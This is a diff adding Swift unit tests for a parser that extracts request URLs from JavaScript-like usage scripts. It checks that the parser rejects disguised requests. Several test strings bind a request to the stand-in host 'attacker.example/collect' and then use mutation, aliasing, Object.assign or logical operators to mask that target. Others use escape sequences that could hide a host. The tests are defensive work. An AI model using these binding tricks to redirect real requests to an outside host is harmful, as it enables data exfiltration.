@@ -272,6 +272,62 @@ final class UsageScriptRequestParserTests: XCTestCase {
         XCTAssertEqual(result?.method, "GET")
     }
 
+    func testRejectsMutableOrComplexRequestBindings() {
+        let cases = [
+            #"const req = { url: 'https://attacker.example/collect' }; req.url = '{{baseUrl}}/usage'; ({ request: req })"#,
+            #"const req = { url: 'https://attacker.example/collect' }; req['url'] = '{{baseUrl}}/usage'; ({ request: req })"#,
+            #"const req = { url: 'https://attacker.example/collect' }; const alias = req; alias.url = '{{baseUrl}}/usage'; ({ request: req })"#,
+            #"const req = { url: 'https://attacker.example/collect' }; Object.assign(req, { url: '{{baseUrl}}/usage' }); ({ request: req })"#,
+            #"const req = { url: 'https://attacker.example/collect' } && { url: '{{baseUrl}}/usage' }; ({ request: req })"#,
+            #"const req = { url: 'https://attacker.example/collect' } || other; ({ request: req })"#,
+            #"const req = { url: 'https://attacker.example/collect' }; const note = `${Object.assign(req, { url: '{{baseUrl}}/usage' })}`; ({ request: req })"#,
+            #"let req = { url: '{{baseUrl}}/usage' }; ({ request: req })"#,
+            #"const req = alias; ({ request: req })"#
+        ]
+        for code in cases {
+            XCTAssertNil(UsageScriptRequestParser.parseRequest(from: code), code)
+        }
+    }
+
+    func testSupportsImmutableShorthandRequest() {
+        let code = #"const request = { url: '{{baseUrl}}/usage', method: 'GET' }; ({ request })"#
+        XCTAssertEqual(
+            UsageScriptRequestParser.parseRequest(from: code, placeholders: ["baseUrl": "https://provider.example"])?.urlTemplate,
+            "https://provider.example/usage"
+        )
+    }
+
+    func testRejectsUnsupportedFinalConfigReference() {
+        let code = #"const config = { request: { url: '{{baseUrl}}/usage' } }; config"#
+        XCTAssertNil(UsageScriptRequestParser.parseRequest(from: code))
+    }
+
+    func testRejectsUnsupportedEscapesInStringsAndTemplates() {
+        for escape in [#"\x61"#, #"\u0061"#, #"\u{61}"#, #"\141"#, #"\0"#, #"\q"#] {
+            for quote in ["\"", "'", "`"] {
+                let code = "({ request: { url: \(quote)https://\(escape)pi-vendor.com/usage\(quote) } })"
+                XCTAssertNil(UsageScriptRequestParser.parseRequest(from: code), code)
+            }
+        }
+    }
+
+    func testAcceptsSupportedEscapesWithoutChangingHost() {
+        let code = #"({ request: { url: 'https:\/\/api-vendor.com\/usage' } })"#
+        XCTAssertEqual(UsageScriptRequestParser.parseRequest(from: code)?.urlTemplate, "https://api-vendor.com/usage")
+    }
+
+    func testRegexReplaceAllRequiresGlobalFlag() {
+        XCTAssertNil(UsageScriptRequestParser.parseRequest(from: #"({ request: { url: 'https://api.example/v1'.replaceAll(/v1/, 'usage') } })"#))
+        XCTAssertEqual(
+            UsageScriptRequestParser.parseRequest(from: #"({ request: { url: 'https://api.example/v1'.replaceAll(/v1/g, 'usage') } })"#)?.urlTemplate,
+            "https://api.example/usage"
+        )
+        for flags in ["gg", "y", "u", "z"] {
+            let code = "({ request: { url: 'https://api.example/v1'.replace(/v1/\(flags), 'usage') } })"
+            XCTAssertNil(UsageScriptRequestParser.parseRequest(from: code))
+        }
+    }
+
     func testPreservesLegacyTopLevelURLSyntax() {
         let cases = [
             #"url: "{{baseUrl}}/balance""#,
